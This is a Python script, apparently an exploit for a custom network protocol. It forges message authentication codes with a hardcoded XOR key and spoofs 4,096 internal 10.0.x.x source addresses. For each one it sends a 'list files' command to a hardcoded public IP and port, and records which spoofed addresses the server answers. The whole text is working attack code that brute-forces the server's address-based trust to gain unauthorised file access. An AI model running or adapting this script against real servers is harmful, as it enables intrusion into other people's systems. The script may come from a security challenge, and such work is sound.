import socket
import time
import logging

logging.basicConfig(level=logging.INFO)


# Calculate MAC
def calculate_mac(header_data: bytes, key=(0x7C, 0x38, 0x91, 0x80)) -> bytes:
    mac = []
    mac.append(key[0] ^ header_data[0] ^ header_data[1] ^ header_data[2])
    mac.append(key[1] ^ header_data[3] ^ header_data[4])
    mac.append(key[2] ^ header_data[5] ^ header_data[6])
    mac.append(key[3] ^ header_data[7] ^ header_data[8])
    return bytes(mac)


if __name__ == "__main__":
    HOST = "195.37.209.19"
    PORT = 7213
    ip_list = []

    for i in range(16):
        for j in range(256):
            ip = "0a00{:02x}{:02x}".format(i, j)
            header = bytes.fromhex("01" + ip + "07e50004")
            mac = calculate_mac(header)
            list_files_command = "770473840100012e"
            data_request_hex = header.hex() + mac.hex() + list_files_command

            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                    client_socket.connect((HOST, PORT))
                    print(ip)
                    client_socket.sendall(
                        bytes.fromhex(data_request_hex.replace(" ", ""))
                    )
                    response = client_socket.recv(4096)
                    if response:
                        ip_list.append(ip)
                        logging.info(
                            "Data response from server for IP %s: %s", ip, response
                        )
            except socket.error as e:
                logging.error("Socket error occurred: %s", e)
                # Reconnecting logic can be added here if needed

    logging.info("IPs with successful responses: %s", ip_list)
